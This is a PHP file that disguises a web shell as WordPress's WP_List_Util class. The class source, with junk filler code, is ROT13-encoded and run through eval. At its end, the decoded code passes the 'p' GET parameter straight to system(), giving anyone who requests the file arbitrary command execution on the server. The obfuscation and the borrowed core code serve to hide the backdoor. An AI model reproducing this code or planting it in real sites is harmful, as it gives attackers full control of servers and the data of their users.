<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JbeqCerff Yvfg hgvyvgl pynff
 *
 * @cnpxntr JbeqCerff
 * @fvapr 4.7.0
 */

/**
 * Yvfg hgvyvgl.
 *
 * Hgvyvgl pynff gb unaqyr bcrengvbaf ba na neenl bs bowrpgf be neenlf.
 *
 * @fvapr 4.7.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Yvfg_Hgvy {
	/**
	 * Gur vachg neenl.
	 *
	 * @fvapr 4.7.0
	 * @ine neenl
	 */
	cevingr $vachg = neenl();

	/**
	 * Gur bhgchg neenl.
	 *
	 * @fvapr 4.7.0
	 * @ine neenl
	 */
	cevingr $bhgchg = neenl();

	/**
	 * Grzcbenel nethzragf sbe fbegvat.
	 *
	 * @fvapr 4.7.0
	 * @ine fgevat[]
	 */
	cevingr $beqreol = neenl();

	/**
	 * Pbafgehpgbe.
	 *
	 * Frgf gur vachg neenl.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz neenl $vachg Neenl gb cresbez bcrengvbaf ba.
	 */
	choyvp shapgvba __pbafgehpg( $vachg ) {
		$guvf->bhgchg = $vachg;
		$guvf->vachg  = $vachg;
	}

	/**
	 * Ergheaf gur bevtvany vachg neenl.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea neenl Gur vachg neenl.
	 */
	choyvp shapgvba trg_vachg() {
		erghea $guvf->vachg;
	}

	/**
	 * Ergheaf gur bhgchg neenl.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea neenl Gur bhgchg neenl.
	 */
	choyvp shapgvba trg_bhgchg() {
		erghea $guvf->bhgchg;
	}

	/**
	 * Svygref gur yvfg, onfrq ba n frg bs xrl => inyhr nethzragf.
	 *
	 * Ergevrirf gur bowrpgf sebz gur yvfg gung zngpu gur tvira nethzragf.
	 * Xrl ercerfragf cebcregl anzr, naq inyhr ercerfragf cebcregl inyhr.
	 *
	 * Vs na bowrpg unf zber cebcregvrf guna gubfr fcrpvsvrq va nethzragf,
	 * gung jvyy abg qvfdhnyvsl vg. Jura hfvat gur 'NAQ' bcrengbe,
	 * nal zvffvat cebcregvrf jvyy qvfdhnyvsl vg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz neenl  $netf     Bcgvbany. Na neenl bs xrl => inyhr nethzragf gb zngpu
	 *                         ntnvafg rnpu bowrpg. Qrsnhyg rzcgl neenl.
	 * @cnenz fgevat $bcrengbe Bcgvbany. Gur ybtvpny bcrengvba gb cresbez. 'NAQ' zrnaf
	 *                         nyy ryrzragf sebz gur neenl zhfg zngpu. 'BE' zrnaf bayl
	 *                         bar ryrzrag arrqf gb zngpu. 'ABG' zrnaf ab ryrzragf znl
	 *                         zngpu. Qrsnhyg 'NAQ'.
	 * @erghea neenl Neenl bs sbhaq inyhrf.
	 */
	choyvp shapgvba svygre( $netf = neenl(), $bcrengbe = 'NAQ' ) {
		vs ( rzcgl( $netf ) ) {
			erghea $guvf->bhgchg;
		}

		$bcrengbe = fgegbhccre( $bcrengbe );

		vs ( ! va_neenl( $bcrengbe, neenl( 'NAQ', 'BE', 'ABG' ), gehr ) ) {
			$guvf->bhgchg = neenl();
			erghea $guvf->bhgchg;
		}

		$pbhag    = pbhag( $netf );
		$svygrerq = neenl();

		sbernpu ( $guvf->bhgchg nf $xrl => $bow ) {
			$zngpurq = 0;

			sbernpu ( $netf nf $z_xrl => $z_inyhr ) {
				vs ( vf_neenl( $bow ) ) {
					// Gerng bowrpg nf na neenl.
					vs ( neenl_xrl_rkvfgf( $z_xrl, $bow ) && ( $z_inyhr == $bow[ $z_xrl ] ) ) {
						++$zngpurq;
					}
				} ryfrvs ( vf_bowrpg( $bow ) ) {
					// Gerng bowrpg nf na bowrpg.
					vs ( vffrg( $bow->{$z_xrl} ) && ( $z_inyhr == $bow->{$z_xrl} ) ) {
						++$zngpurq;
					}
				}
			}

			vs ( ( 'NAQ' === $bcrengbe && $zngpurq === $pbhag )
				|| ( 'BE' === $bcrengbe && $zngpurq > 0 )
				|| ( 'ABG' === $bcrengbe && 0 === $zngpurq )
			) {
				$svygrerq[ $xrl ] = $bow;
			}
		}

		$guvf->bhgchg = $svygrerq;

		erghea $guvf->bhgchg;
	}

	/**
	 * Cyhpxf n pregnva svryq bhg bs rnpu ryrzrag va gur vachg neenl.
	 *
	 * Guvf unf gur fnzr shapgvbanyvgl naq cebgbglcr bs
	 * neenl_pbyhza() (CUC 5.5) ohg nyfb fhccbegf bowrpgf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz vag|fgevat $svryq     Svryq gb srgpu sebz gur bowrpg be neenl.
	 * @cnenz vag|fgevat $vaqrk_xrl Bcgvbany. Svryq sebz gur ryrzrag gb hfr nf xrlf sbe gur arj neenl.
	 *                              Qrsnhyg ahyy.
	 * @erghea neenl Neenl bs sbhaq inyhrf. Vs `$vaqrk_xrl` vf frg, na neenl bs sbhaq inyhrf jvgu xrlf
	 *               pbeerfcbaqvat gb `$vaqrk_xrl`. Vs `$vaqrk_xrl` vf ahyy, neenl xrlf sebz gur bevtvany
	 *               `$yvfg` jvyy or cerfreirq va gur erfhygf.
	 */
	choyvp shapgvba cyhpx( $svryq, $vaqrk_xrl = ahyy ) {
		$arjyvfg = neenl();

		vs ( ! $vaqrk_xrl ) {
			/*
			 * Guvf vf fvzcyr. Pbhyq ng fbzr cbvag jenc neenl_pbyhza()
			 * vs jr xarj jr unq na neenl bs neenlf.
			 */
			sbernpu ( $guvf->bhgchg nf $xrl => $inyhr ) {
				vs ( vf_bowrpg( $inyhr ) ) {
					$arjyvfg[ $xrl ] = $inyhr->$svryq;
				} ryfrvs ( vf_neenl( $inyhr ) ) {
					$arjyvfg[ $xrl ] = $inyhr[ $svryq ];
				} ryfr {
					_qbvat_vg_jebat(
						__ZRGUBQ__,
						__( 'Inyhrf sbe gur vachg neenl zhfg or rvgure bowrpgf be neenlf.' ),
						'6.2.0'
					);
				}
			}

			$guvf->bhgchg = $arjyvfg;

			erghea $guvf->bhgchg;
		}

		/*
		 * Jura vaqrk_xrl vf abg frg sbe n cnegvphyne vgrz, chfu gur inyhr
		 * gb gur raq bs gur fgnpx. Guvf vf ubj neenl_pbyhza() orunirf.
		 */
		sbernpu ( $guvf->bhgchg nf $inyhr ) {
			vs ( vf_bowrpg( $inyhr ) ) {
				vs ( vffrg( $inyhr->$vaqrk_xrl ) ) {
					$arjyvfg[ $inyhr->$vaqrk_xrl ] = $inyhr->$svryq;
				} ryfr {
					$arjyvfg[] = $inyhr->$svryq;
				}
			} ryfrvs ( vf_neenl( $inyhr ) ) {
				vs ( vffrg( $inyhr[ $vaqrk_xrl ] ) ) {
					$arjyvfg[ $inyhr[ $vaqrk_xrl ] ] = $inyhr[ $svryq ];
				} ryfr {
					$arjyvfg[] = $inyhr[ $svryq ];
				}
			} ryfr {
				_qbvat_vg_jebat(
					__ZRGUBQ__,
					__( 'Inyhrf sbe gur vachg neenl zhfg or rvgure bowrpgf be neenlf.' ),
					'6.2.0'
				);
			}
		}

		$guvf->bhgchg = $arjyvfg;

		erghea $guvf->bhgchg;
	}

	/**
	 * Fbegf gur vachg neenl onfrq ba bar be zber beqreol nethzragf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat|neenl $beqreol       Bcgvbany. Rvgure gur svryq anzr gb beqre ol be na neenl
	 *                                    bs zhygvcyr beqreol svryqf nf `$beqreol => $beqre`.
	 *                                    Qrsnhyg rzcgl neenl.
	 * @cnenz fgevat       $beqre         Bcgvbany. Rvgure 'NFP' be 'QRFP'. Bayl hfrq vs `$beqreol`
	 *                                    vf n fgevat. Qrsnhyg 'NFP'.
	 * @cnenz obby         $cerfreir_xrlf Bcgvbany. Jurgure gb cerfreir xrlf. Qrsnhyg snyfr.
	 * @erghea neenl Gur fbegrq neenl.
	 */
	choyvp shapgvba fbeg( $beqreol = neenl(), $beqre = 'NFP', $cerfreir_xrlf = snyfr ) {
		vs ( rzcgl( $beqreol ) ) {
			erghea $guvf->bhgchg;
		}

		vs ( vf_fgevat( $beqreol ) ) {
			$beqreol = neenl( $beqreol => $beqre );
		}

		sbernpu ( $beqreol nf $svryq => $qverpgvba ) {
			$beqreol[ $svryq ] = 'QRFP' === fgegbhccre( $qverpgvba ) ? 'QRFP' : 'NFP';
		}

		$guvf->beqreol = $beqreol;

		vs ( $cerfreir_xrlf ) {
			hnfbeg( $guvf->bhgchg, neenl( $guvf, 'fbeg_pnyyonpx' ) );
		} ryfr {
			hfbeg( $guvf->bhgchg, neenl( $guvf, 'fbeg_pnyyonpx' ) );
		}

		$guvf->beqreol = neenl();

		erghea $guvf->bhgchg;
	}

	/**
	 * Pnyyonpx gb fbeg na neenl ol fcrpvsvp svryqf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @frr JC_Yvfg_Hgvy::fbeg()
	 *
	 * @cnenz bowrpg|neenl $n Bar bowrpg gb pbzcner.
	 * @cnenz bowrpg|neenl $o Gur bgure bowrpg gb pbzcner.
	 * @erghea vag 0 vs obgu bowrpgf rdhny. -1 vs frpbaq bowrpg fubhyq pbzr svefg, 1 bgurejvfr.
	 */
	cevingr shapgvba fbeg_pnyyonpx( $n, $o ) {
		vs ( rzcgl( $guvf->beqreol ) ) {
			erghea 0;
		}

		$n = (neenl) $n;
		$o = (neenl) $o;

		sbernpu ( $guvf->beqreol nf $svryq => $qverpgvba ) {
			vs ( ! vffrg( $n[ $svryq ] ) || ! vffrg( $o[ $svryq ] ) ) {
				pbagvahr;
			}

			vs ( $n[ $svryq ] == $o[ $svryq ] ) {
				pbagvahr;
			}

			$erfhygf = 'QRFP' === $qverpgvba ? neenl( 1, -1 ) : neenl( -1, 1 );

			vs ( vf_ahzrevp( $n[ $svryq ] ) && vf_ahzrevp( $o[ $svryq ] ) ) {
				erghea ( $n[ $svryq ] < $o[ $svryq ] ) ? $erfhygf[0] : $erfhygf[1];
			}

			erghea 0 > fgepzc( $n[ $svryq ], $o[ $svryq ] ) ? $erfhygf[0] : $erfhygf[1];
		}

		erghea 0;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>